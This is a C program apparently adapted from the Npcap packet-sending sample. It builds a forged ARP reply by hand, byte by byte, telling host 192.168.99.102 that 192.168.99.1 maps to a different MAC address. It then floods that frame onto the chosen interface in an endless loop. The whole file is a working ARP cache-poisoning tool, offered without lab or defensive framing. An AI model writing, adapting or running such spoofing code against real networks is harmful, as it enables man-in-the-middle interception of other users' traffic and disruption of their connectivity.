#include <stdlib.h>
#include <stdio.h>

#include <pcap.h>

#ifdef WIN32
#include <tchar.h>
BOOL LoadNpcapDlls()
{
	_TCHAR npcap_dir[512];
	UINT len;
	len = GetSystemDirectory(npcap_dir, 480);
	if (!len) {
		fprintf(stderr, "Error in GetSystemDirectory: %x", GetLastError());
		return FALSE;
	}
	_tcscat_s(npcap_dir, 512, _T("\\Npcap"));
	if (SetDllDirectory(npcap_dir) == 0) {
		fprintf(stderr, "Error in SetDllDirectory: %x", GetLastError());
		return FALSE;
	}
	return TRUE;
}
#endif

void arpPack(u_char *packet)
{
	packet[0] = 0x68;
	packet[1] = 0x5b;
	packet[2] = 0x35;
	packet[3] = 0x8b;
	packet[4] = 0x8e;
	packet[5] = 0x0b;

	packet[6] = 0x00;
	packet[7] = 0xe0;
	packet[8] = 0x4c;
	packet[9] = 0xf6;
	packet[10] = 0x23;
	packet[11] = 0x29;

	packet[12] = 0x08;
	packet[13] = 0x06;


	packet[14] = 0x00;
	packet[15] = 0x01;
	
	packet[16] = 0x08;
	packet[17] = 0x00;

	packet[18] = 0x06;

	packet[19] = 0x04;

	packet[20] = 0x00;
	packet[21] = 0x02;

	packet[22] = 0x00;
	packet[23] = 0xe0;
	packet[24] = 0x4c;
	packet[25] = 0xf6;
	packet[26] = 0x23;
	packet[27] = 0x29;

	packet[28] = 0xc0;
	packet[29] = 0xa8;
	packet[30] = 0x63;
	packet[31] = 0x01;

	packet[32] = 0x68;
	packet[33] = 0x5b;
	packet[34] = 0x35;
	packet[35] = 0x8b;
	packet[36] = 0x8e;
	packet[37] = 0x0b;

	packet[38] = 0xc0;
	packet[39] = 0xa8;
	packet[40] = 0x63;
	packet[41] = 0x66;
}
int main(int argc, char **argv)
{
	pcap_t *fp;
	char errbuf[PCAP_ERRBUF_SIZE];
	u_char packet[100];
	pcap_if_t* alldevs;
	pcap_if_t* d;

	int inum;
	int i = 0;

#ifdef WIN32
	/* Load Npcap and its functions. */
	if (!LoadNpcapDlls())
	{
		fprintf(stderr, "Couldn't load Npcap\n");
		exit(1);
	}
#endif

	/* Retrieve the device list */
	if (pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}

	/* Print the list */
	for (d = alldevs; d; d = d->next)
	{
		printf("%d. %s", ++i, d->name);
		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (No description available)\n");
	}

	if (i == 0)
	{
		printf("\nNo interfaces found! Make sure Npcap is installed.\n");
		return -1;
	}

	printf("Enter the interface number (1-%d):", i);
	scanf("%d", &inum);

	if (inum < 1 || inum > i)
	{
		printf("\nInterface number out of range.\n");
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return -1;
	}

	/* Jump to the selected adapter */
	for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++);
    
	/* Open the adapter */
	if ((fp = pcap_open_live(d->name,		// name of the device
							 65536,			// portion of the packet to capture. It doesn't matter in this case 
							 1,				// promiscuous mode (nonzero means promiscuous)
							 1000,			// read timeout
							 errbuf			// error buffer
							 )) == NULL)
	{
		fprintf(stderr,"\nUnable to open the adapter. %s is not supported by Npcap\n", argv[1]);
		return 2;
	}

	///* Supposing to be on ethernet, set mac destination to 1:1:1:1:1:1 */
	//packet[0]=1;
	//packet[1]=1;
	//packet[2]=1;
	//packet[3]=1;
	//packet[4]=1;
	//packet[5]=1;
	//
	///* set mac source to 2:2:2:2:2:2 */
	//packet[6]=2;
	//packet[7]=2;
	//packet[8]=2;
	//packet[9]=2;
	//packet[10]=2;
	//packet[11]=2;
	//
	///* Fill the rest of the packet */
	//for(i=12;i<100;i++)
	//{
	//	packet[i]= (u_char)i;
	//}
	arpPack(packet);
	/* Send down the packet */
	while (1)
	{
		if (pcap_sendpacket(fp,	// Adapter
			packet,				// buffer with the packet
			42					// size
		) != 0)
		{
			fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(fp));
			return 3;
		}
	}

	pcap_close(fp);	
	return 0;
}

